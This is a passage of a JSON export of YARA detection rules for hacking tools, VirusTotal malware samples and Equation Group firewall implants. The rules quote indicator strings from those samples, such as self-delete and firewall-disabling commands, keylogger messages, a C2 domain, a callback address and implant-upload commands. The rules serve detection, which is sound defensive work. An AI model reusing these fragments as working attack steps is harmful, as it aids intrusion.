\"KgAgAGwAbwBjAGEAbAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAIAAqAA\" ascii\n      $s7 = \"}.bruteforce_running)\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0xbbef and filesize < 200KB and 2 of them ) or ( 4 of them )\n}","date":"2016-09-04 14:54:01","description":"Semiautomatic generated rule - from files Inveigh-BruteForce.ps1","minimum_yara":"1.7","name":"ps1_toolkit_Inveigh_BruteForce_3_RID3395","reference":"https://github.com/vysec/ps1-toolkit","required_modules":[],"rule_hash":"0ac9563f4bba15363810cee1964e428f","score":80,"tags":["DEMO","T1110","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Malware_QA_not_copy_RID2E95 : DEMO EXE FILE MAL {\n   meta:\n      description = \"VT Research QA uploaded malware - file not copy.exe\"\n      author = \"Florian Roth\"\n      reference = \"VT Research QA\"\n      date = \"2016-08-29 11:20:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"U2VydmVyLmV4ZQ==\" fullword wide\n      $x2 = \"\\\\not copy\\\\obj\\\\Debug\\\\not copy.pdb\" ascii\n      $x3 = \"fuckyou888.ddns.net\" fullword wide\n      $s1 = \"cmd.exe /c ping 0 -n 2 & del \\\"\" fullword wide\n      $s2 = \"Server.exe\" fullword wide\n      $s3 = \"Execute ERROR\" fullword wide\n      $s4 = \"not copy.exe\" fullword wide\n      $s5 = \"Non HosT\" fullword wide\n      $s6 = \"netsh firewall delete allowedprogram\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 1 of ( $x* ) or 4 of ( $s* ) ) ) or ( 5 of them )\n}","date":"2016-08-29 11:20:41","description":"VT Research QA uploaded malware - file not copy.exe","minimum_yara":"1.7","name":"Malware_QA_not_copy_RID2E95","reference":"VT Research QA","required_modules":[],"rule_hash":"6d288671603d06b96c868787895533f1","score":80,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Malware_QA_update_RID2DAD : DEMO EXE FILE MAL {\n   meta:\n      description = \"VT Research QA uploaded malware - file update.exe\"\n      author = \"Florian Roth\"\n      reference = \"VT Research QA\"\n      date = \"2016-08-29 10:42:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"UnActiveOfflineKeylogger\" fullword ascii\n      $x2 = \"BTRESULTDownload File|Mass Download : File Downloaded , Executing new one in temp dir...|\" fullword ascii\n      $x3 = \"ActiveOnlineKeylogger\" fullword ascii\n      $x4 = \"C:\\\\Users\\\\DarkCoderSc\\\\\" ascii\n      $x5 = \"Celesty Binder\\\\Stub\\\\STATIC\\\\Stub.pdb\" ascii\n      $x6 = \"BTRESULTUpdate from URL|Update : File Downloaded , Executing new one in temp dir...|\" fullword ascii\n      $s1 = \"MSRSAAP.EXE\" fullword wide\n      $s2 = \"Command successfully executed!|\" fullword ascii\n      $s3 = \"BTMemoryLoadLibary: Get DLLEntyPoint failed\" fullword ascii\n      $s4 = \"I wasn't able to open the hosts file, maybe because UAC is enabled in remote computer!\" fullword ascii\n      $s5 = \"\\\\Internet Explorer\\\\iexplore.exe\" fullword ascii\n      $s6 = \"ping 127.0.0.1 -n 4 > NUL && \\\"\" fullword ascii\n      $s7 = \"BTMemoryGetProcAddress: DLL doesn't export anything\" fullword ascii\n      $s8 = \"POST /index.php/1.0\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( 1 of ( $x* ) or 3 of ( $s* ) ) ) or ( all of them )\n}","date":"2016-08-29 10:42:01","description":"VT Research QA uploaded malware - file update.exe","minimum_yara":"1.7","name":"Malware_QA_update_RID2DAD","reference":"VT Research QA","required_modules":[],"rule_hash":"44e4e17251d3eabbb5c7c8265ecaf65d","score":80,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Malware_QA_tls_RID2C7D : DEMO EXE FILE MAL {\n   meta:\n      description = \"VT Research QA uploaded malware - file tls.exe\"\n      author = \"Florian Roth\"\n      reference = \"VT Research QA\"\n      date = \"2016-08-29 09:51:21\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\funoverip\\\\ultimate-payload-template1\\\\\" ascii\n      $s2 = \"ULTIMATEPAYLOADTEMPLATE1\" fullword wide\n      $s3 = \"ultimate-payload-template1\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them ) or ( all of them )\n}","date":"2016-08-29 09:51:21","description":"VT Research QA uploaded malware - file tls.exe","minimum_yara":"1.7","name":"Malware_QA_tls_RID2C7D","reference":"VT Research QA","required_modules":[],"rule_hash":"d1a91cac10548e7a6cc189137ae584ad","score":80,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Malware_QA_get_The_FucKinG_IP_RID31C8 : DEMO EXE FILE MAL {\n   meta:\n      description = \"VT Research QA uploaded malware - file get The FucKinG IP.exe\"\n      author = \"Florian Roth\"\n      reference = \"VT Research QA\"\n      date = \"2016-08-29 13:37:11\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"C:\\\\Users\\\\Mdram ahmed\\\\AppData\" \n      $x2 = \"\\\\Local\\\\Temporary Projects\\\\get The FucKinG IP\\\\\" ascii\n      $x3 = \"get The FucKinG IP.exe\" fullword wide\n      $x4 = \"get ip by mdr3m\" fullword wide\n      $x5 = \"MDR3M kik: Mdr3mhm\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 1 of ( $x* ) ) or ( 2 of them )\n}","date":"2016-08-29 13:37:11","description":"VT Research QA uploaded malware - file get The FucKinG IP.exe","minimum_yara":"1.7","name":"Malware_QA_get_The_FucKinG_IP_RID31C8","reference":"VT Research QA","required_modules":[],"rule_hash":"64d9ad3382c32ecfa570297dd6609fd2","score":80,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Malware_QA_1177_RID2BFA : DEMO FILE MAL {\n   meta:\n      description = \"VT Research QA uploaded malware - file 1177.vbs\"\n      author = \"Florian Roth\"\n      reference = \"VT Research QA\"\n      date = \"2016-08-29 09:29:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \".specialfolders (\\\"startup\\\") & \\\"\\\\ServerName.EXE\\\"\" fullword ascii\n      $x2 = \"expandenvironmentstrings(\\\"%%InsallDir%%\\\") \" ascii\n      $s1 = \"CreateObject(\\\"WScript.Shell\\\").Run(\" ascii\n      $s2 = \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAA\" ascii\n      $s3 = \"cial Thank's to Dev-point.com\" fullword ascii\n      $s4 = \".createElement(\\\"tmp\\\")\" fullword ascii\n      $s5 = \"'%CopyToStartUp%\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x4d27 and filesize < 100KB and ( 1 of ( $x* ) or 4 of ( $s* ) ) ) or ( 5 of them )\n}","date":"2016-08-29 09:29:31","description":"VT Research QA uploaded malware - file 1177.vbs","minimum_yara":"1.7","name":"Malware_QA_1177_RID2BFA","reference":"VT Research QA","required_modules":[],"rule_hash":"26deb049d1fff4920697923d81970553","score":80,"tags":["DEMO","FILE","MAL"]},{"author":"Florian Roth","content":"rule WCE_in_memory_RID2C1E : DEMO HKTL T1003 {\n   meta:\n      description = \"Detects Windows Credential Editor (WCE) in memory (and also on disk)\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-08-28 09:35:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"wkKUSvflehHr::o:t:s:c:i:d:a:g:\" fullword ascii\n      $s2 = \"wceaux.dll\" fullword ascii\n   condition: \n      all of them\n}","date":"2016-08-28 09:35:31","description":"Detects Windows Credential Editor (WCE) in memory (and also on disk)","minimum_yara":"1.7","name":"WCE_in_memory_RID2C1E","reference":"Internal Research","required_modules":[],"rule_hash":"634fcb7acfe59de1147b96df09f6cee9","score":80,"tags":["DEMO","T1003","HKTL"]},{"author":"Florian Roth","content":"rule b374k_back_connect_RID2DB5 : APT DEMO EXE FILE T1068 {\n   meta:\n      description = \"Detects privilege escalation tool\"\n      author = \"Florian Roth\"\n      reference = \"Internal Analysis\"\n      date = \"2016-08-18 10:43:21\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      nodeepdive = \"1\"\n      tags = \"APT, DEMO, EXE, FILE, T1068\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"AddAtomACreatePro\" fullword ascii\n      $s2 = \"shutdow\" fullword ascii\n      $s3 = \"/config/i386\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 10KB and all of them )\n}","date":"2016-08-18 10:43:21","description":"Detects privilege escalation tool","minimum_yara":"1.7","name":"b374k_back_connect_RID2DB5","reference":"Internal Analysis","required_modules":[],"rule_hash":"407bb57ac443844d316c5b0f03f4633a","score":80,"tags":["APT","DEMO","EXE","FILE","T1068"]},{"author":"Florian Roth","content":"rule APT_EQGRP_RC5_RC6_Opcode_RID2EE0 : APT DEMO {\n   meta:\n      description = \"EQGRP Toolset Firewall - RC5 / RC6 opcode\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/incidents/75812/the-equation-giveaway/\"\n      date = \"2016-08-17 11:33:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = { 8B 74 91 FC 81 EE 47 86 C8 61 89 34 91 42 83 FA 2B } \n   condition: \n      1 of them\n}","date":"2016-08-17 11:33:11","description":"EQGRP Toolset Firewall - RC5 / RC6 opcode","minimum_yara":"1.7","name":"APT_EQGRP_RC5_RC6_Opcode_RID2EE0","reference":"https://securelist.com/blog/incidents/75812/the-equation-giveaway/","required_modules":[],"rule_hash":"b38cb20b42b04d579fa9b8eef3c2b076","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule APT_install_get_persistent_filenames_RID35AE : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - file install_get_persistent_filenames\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 16:23:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Generates the persistence file name and prints it out.\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and all of them )\n}","date":"2016-08-16 16:23:31","description":"EQGRP Toolset Firewall - file install_get_persistent_filenames","minimum_yara":"1.7","name":"APT_install_get_persistent_filenames_RID35AE","reference":"Research","required_modules":[],"rule_hash":"18597aad06dd41e9cf3edb8627fe57ac","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_create_dns_injection_RID326D : APT DEMO {\n   meta:\n      description = \"EQGRP Toolset Firewall - file create_dns_injection.py\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 14:04:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Name:   A hostname: 'host.network.com', a decimal numeric offset within\" fullword ascii\n      $s2 = \"-a www.badguy.net,CNAME,1800,host.badguy.net \\\\\\\\\" fullword ascii\n   condition: \n      1 of them\n}","date":"2016-08-16 14:04:41","description":"EQGRP Toolset Firewall - file create_dns_injection.py","minimum_yara":"1.7","name":"APT_EQGRP_create_dns_injection_RID326D","reference":"Research","required_modules":[],"rule_hash":"40f64937508bec4cf5247484111f1cc3","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule APT_EQGRP_screamingplow_RID2FAE : APT DEMO {\n   meta:\n      description = \"EQGRP Toolset Firewall - file screamingplow.sh\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 12:07:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"What is the name of your PBD:\" fullword ascii\n      $s2 = \"You are now ready for a ScreamPlow\" fullword ascii\n   condition: \n      1 of them\n}","date":"2016-08-16 12:07:31","description":"EQGRP Toolset Firewall - file screamingplow.sh","minimum_yara":"1.7","name":"APT_EQGRP_screamingplow_RID2FAE","reference":"Research","required_modules":[],"rule_hash":"97617c6c734f56af00f141ef70808b1a","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule APT_EQGRP_MixText_RID2D06 : APT DEMO {\n   meta:\n      description = \"EQGRP Toolset Firewall - file MixText.py\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 10:14:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"BinStore enabled implants.\" fullword ascii\n   condition: \n      1 of them\n}","date":"2016-08-16 10:14:11","description":"EQGRP Toolset Firewall - file MixText.py","minimum_yara":"1.7","name":"APT_EQGRP_MixText_RID2D06","reference":"Research","required_modules":[],"rule_hash":"e5ff327d23b429d8eb0f8da9647c08c9","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule APT_EQGRP_tunnel_state_reader_RID321B : APT DEMO {\n   meta:\n      description = \"EQGRP Toolset Firewall - file tunnel_state_reader\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 13:51:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Active connections will be maintained for this tunnel. Timeout:\" fullword ascii\n      $s5 = \"%s: compatible with BLATSTING version 1.2\" fullword ascii\n   condition: \n      1 of them\n}","date":"2016-08-16 13:51:01","description":"EQGRP Toolset Firewall - file tunnel_state_reader","minimum_yara":"1.7","name":"APT_EQGRP_tunnel_state_reader_RID321B","reference":"Research","required_modules":[],"rule_hash":"3933c0823eb49d7f12d91216fbc27220","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule APT_EQGRP_payload_RID2D1D : APT DEMO {\n   meta:\n      description = \"EQGRP Toolset Firewall - file payload.py\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 10:18:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"can't find target version module!\" fullword ascii\n      $s2 = \"class Payload:\" fullword ascii\n   condition: \n      all of them\n}","date":"2016-08-16 10:18:01","description":"EQGRP Toolset Firewall - file payload.py","minimum_yara":"1.7","name":"APT_EQGRP_payload_RID2D1D","reference":"Research","required_modules":[],"rule_hash":"db7972df2a542c87dab866c324c89754","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule APT_EQGRP_BUSURPER_2211_724_RID2ECC : APT DEMO {\n   meta:\n      description = \"EQGRP Toolset Firewall - file BUSURPER-2211-724.exe\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:29:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".got_loader\" fullword ascii\n      $s2 = \"_start_text\" fullword ascii\n      $s3 = \"IMPLANT\" fullword ascii\n      $s4 = \"KEEPGOING\" fullword ascii\n      $s5 = \"upgrade_implant\" fullword ascii\n   condition: \n      all of them\n}","date":"2016-08-16 11:29:51","description":"EQGRP Toolset Firewall - file BUSURPER-2211-724.exe","minimum_yara":"1.7","name":"APT_EQGRP_BUSURPER_2211_724_RID2ECC","reference":"Research","required_modules":[],"rule_hash":"d321ea7b77f23d0a23b3c5828563ad91","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule APT_EQGRP_networkProfiler_orderScans_RID34F3 : APT DEMO {\n   meta:\n      description = \"EQGRP Toolset Firewall - file networkProfiler_orderScans.sh\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 15:52:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Unable to save off predefinedScans directory\" fullword ascii\n      $x2 = \"Re-orders the networkProfiler scans so they show up in order in the LP\" fullword ascii\n   condition: \n      1 of them\n}","date":"2016-08-16 15:52:21","description":"EQGRP Toolset Firewall - file networkProfiler_orderScans.sh","minimum_yara":"1.7","name":"APT_EQGRP_networkProfiler_orderScans_RID34F3","reference":"Research","required_modules":[],"rule_hash":"f23017fa5a89bd2b5138d21b9f390229","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule APT_EQGRP_epicbanana_2_1_0_1_RID3075 : APT DEMO {\n   meta:\n      description = \"EQGRP Toolset Firewall - file epicbanana_2.1.0.1.py\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 12:40:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"failed to create version-specific payload\" fullword ascii\n      $s2 = \"(are you sure you did \\\"make [version]\\\" in versions?)\" fullword ascii\n   condition: \n      1 of them\n}","date":"2016-08-16 12:40:41","description":"EQGRP Toolset Firewall - file epicbanana_2.1.0.1.py","minimum_yara":"1.7","name":"APT_EQGRP_epicbanana_2_1_0_1_RID3075","reference":"Research","required_modules":[],"rule_hash":"0143e3e7de8d23cc48400394874ebe9a","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule APT_EQGRP_userscript_RID2E87 : APT DEMO {\n   meta:\n      description = \"EQGRP Toolset Firewall - file userscript.FW\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:18:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Are you sure? Don't forget that NETSCREEN firewalls require BANANALIAR!! \" fullword ascii\n   condition: \n      1 of them\n}","date":"2016-08-16 11:18:21","description":"EQGRP Toolset Firewall - file userscript.FW","minimum_yara":"1.7","name":"APT_EQGRP_userscript_RID2E87","reference":"Research","required_modules":[],"rule_hash":"c302f2fc10e4368c37baefd0498a7b9a","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule APT_EQGRP_BUSURPER_3001_724_RID2ECA : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - file BUSURPER-3001-724.exe\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:29:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"IMPLANT\" fullword ascii\n      $s2 = \"KEEPGOING\" fullword ascii\n      $s3 = \"upgrade_implant\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 200KB and 2 of them ) or ( all of them )\n}","date":"2016-08-16 11:29:31","description":"EQGRP Toolset Firewall - file BUSURPER-3001-724.exe","minimum_yara":"1.7","name":"APT_EQGRP_BUSURPER_3001_724_RID2ECA","reference":"Research","required_modules":[],"rule_hash":"06ee316e9ebb05dbd793779766196127","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_sploit_py_RID2E16 : APT DEMO {\n   meta:\n      description = \"EQGRP Toolset Firewall - file sploit.py\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 10:59:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"the --spoof option requires 3 or 4 fields as follows redir_ip\" ascii\n      $x2 = \"[-] timeout waiting for response - target may have crashed\" fullword ascii\n      $x3 = \"[-] no response from health check - target may have crashed\" fullword ascii\n   condition: \n      1 of them\n}","date":"2016-08-16 10:59:31","description":"EQGRP Toolset Firewall - file sploit.py","minimum_yara":"1.7","name":"APT_EQGRP_sploit_py_RID2E16","reference":"Research","required_modules":[],"rule_hash":"75392d2c415fd57df243f0e1f7999af7","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule APT_EQGRP_uninstallPBD_RID2EE3 : APT DEMO {\n   meta:\n      description = \"EQGRP Toolset Firewall - file uninstallPBD.bat\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:33:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"memset 00e9a05c 4 38845b88\" fullword ascii\n      $s2 = \"_hidecmd\" fullword ascii\n      $s3 = \"memset 013abd04 1 0d\" fullword ascii\n   condition: \n      all of them\n}","date":"2016-08-16 11:33:41","description":"EQGRP Toolset Firewall - file uninstallPBD.bat","minimum_yara":"1.7","name":"APT_EQGRP_uninstallPBD_RID2EE3","reference":"Research","required_modules":[],"rule_hash":"030aa292729c501d6b51cf53d8414f8f","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule APT_EQGRP_tinyexec_RID2D9C : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - from files tinyexec\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 10:39:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = { 73 68 73 74 72 74 61 62 00 2E 74 65 78 74 } \n      $s2 = { 5A 58 55 52 89 E2 55 50 89 E1 } \n   condition: \n      uint32 ( 0 ) == 0x464c457f and filesize < 270 and all of them\n}","date":"2016-08-16 10:39:11","description":"EQGRP Toolset Firewall - from files tinyexec","minimum_yara":"1.7","name":"APT_EQGRP_tinyexec_RID2D9C","reference":"Research","required_modules":[],"rule_hash":"6c9162cf7f4d1da8645b10b8293e3854","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_callbacks_RID2DD3 : APT DEMO {\n   meta:\n      description = \"EQGRP Toolset Firewall - Callback addresses\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 10:48:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"30.40.50.60:9342\" fullword ascii wide\n   condition: \n      1 of them\n}","date":"2016-08-16 10:48:21","description":"EQGRP Toolset Firewall - Callback addresses","minimum_yara":"1.7","name":"APT_EQGRP_callbacks_RID2DD3","reference":"Research","required_modules":[],"rule_hash":"df044b137e069c5d842e58e48499317e","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule APT_EQGRP_Unique_Strings_RID2FF3 : APT DEMO {\n   meta:\n      description = \"EQGRP Toolset Firewall - Unique strings\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 12:19:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"/BananaGlee/ELIGIBLEBOMB\" ascii\n      $s2 = \"Protocol must be either http or https (Ex: https://1.2.3.4:1234)\" \n   condition: \n      1 of them\n}","date":"2016-08-16 12:19:01","description":"EQGRP Toolset Firewall - Unique strings","minimum_yara":"1.7","name":"APT_EQGRP_Unique_Strings_RID2FF3","reference":"Research","required_modules":[],"rule_hash":"5d187740298457865db568d7659e6b50","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule APT_EQGRP_eligiblecandidate_RID310D : APT DEMO {\n   meta:\n      description = \"EQGRP Toolset Firewall - file eligiblecandidate.py\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 13:06:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $o1 = \"Connection timed out. Only a problem if the callback was not received.\" fullword ascii\n      $o2 = \"Could not reliably detect cookie. Using 'session_id'...\" fullword ascii\n      $c1 = \"def build_exploit_payload(self,cmd=\\\"/tmp/httpd\\\"):\" fullword ascii\n      $c2 = \"self.build_exploit_payload(cmd)\" fullword ascii\n   condition: \n      1 of them\n}","date":"2016-08-16 13:06:01","description":"EQGRP Toolset Firewall - file eligiblecandidate.py","minimum_yara":"1.7","name":"APT_EQGRP_eligiblecandidate_RID310D","reference":"Research","required_modules":[],"rule_hash":"55d542a53d2169b25bdb0bcbc385c1fd","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule APT_EQGRP_sniffer_xml2pcap_RID30A6 : APT DEMO T1040 {\n   meta:\n      description = \"EQGRP Toolset Firewall - file sniffer_xml2pcap\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 12:48:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, T1040\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"-s/--srcip <sourceIP>  Use given source IP (if sniffer doesn't collect source IP)\" fullword ascii\n      $x2 = \"convert an XML file generated by the BLATSTING sniffer module into a pcap capture file.\" fullword ascii\n   condition: \n      1 of them\n}","date":"2016-08-16 12:48:51","description":"EQGRP Toolset Firewall - file sniffer_xml2pcap","minimum_yara":"1.7","name":"APT_EQGRP_sniffer_xml2pcap_RID30A6","reference":"Research","required_modules":[],"rule_hash":"0d119859efc7d96ad9b9029bd0083211","score":75,"tags":["APT","DEMO","T1040"]},{"author":"Florian Roth","content":"rule APT_EQGRP_BananaAid_RID2D82 : APT DEMO T1105 {\n   meta:\n      description = \"EQGRP Toolset Firewall - file BananaAid\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 10:34:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, T1105\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"(might have to delete key in ~/.ssh/known_hosts on linux box)\" fullword ascii\n      $x2 = \"scp BGLEE-\" ascii\n      $x3 = \"should be 4bfe94b1 for clean bootloader version 3.0; \" fullword ascii\n      $x4 = \"scp <configured implant> <username>@<IPaddr>:onfig\" fullword ascii\n   condition: \n      1 of them\n}","date":"2016-08-16 10:34:51","description":"EQGRP Toolset Firewall - file BananaAid","minimum_yara":"1.7","name":"APT_EQGRP_BananaAid_RID2D82","reference":"Research","required_modules":[],"rule_hash":"fff10477e6dbfdfb7727fecf0cbf2e85","score":75,"tags":["APT","DEMO","T1105"]},{"author":"Florian Roth","content":"rule APT_EQGRP_bo_RID2B04 : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - file bo\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 08:48:31\"\n      score = 75\n      customer = 